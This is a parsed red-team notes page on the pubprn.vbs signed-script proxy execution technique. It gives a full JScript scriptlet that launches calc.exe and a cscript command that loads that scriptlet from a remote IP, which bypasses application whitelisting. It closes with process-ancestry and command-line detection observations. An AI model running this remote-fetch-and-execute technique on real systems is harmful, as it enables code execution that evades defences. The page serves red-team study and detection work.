---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# pubprn.vbs Signed Script Code Execution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1216-signed-script-ce` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1216-signed-script-ce.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml that will be executed by the script:

## Preserved Body

````markdown
## Execution

Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml that will be executed by the script:
```markup
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"   
	>
</registration>

<script language="JScript">
<![CDATA[
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
]]>
</script>

</scriptlet>
```
```csharp
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
```
## Observations

Calc.exe gets spawned by cscript.exe which immediately closes leaving the calc.exe process orphan:

![](<../../_assets/pubprn-csript.png>)

![](<../../_assets/pubprn-ancestry.png>)

Monitoring commandlines can be useful in detecting the script being abused:

![](<../../_assets/pubprn-logs.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/pubprn.vbs-signed-script-code-execution.md)

## Evidence Excerpt

````text
_asset_filenames:
- pubprn-ancestry.png
- pubprn-csript.png
- pubprn-logs.png
_body: "---\ndescription: >-\n  Signed Script Proxy Execution - bypass application whitelisting using\n  pubprn.vbs\n---\n\
\n# pubprn.vbs Signed Script Code Execution\n\n## Execution\n\nUsing pubprn.vbs, we will execute code to launch calc.exe.\
\ First of, the xml that will be executed by the script:\n\n{% code title=\"http://192.168.2.71/tools/mitre/proxy-script/proxy.sct\"\
\ %}\n```markup\n<?XML version=\"1.0\"?>\n<scriptlet>\n\n<registration\n    description=\"Bandit\"\n    progid=\"Bandit\"\
````
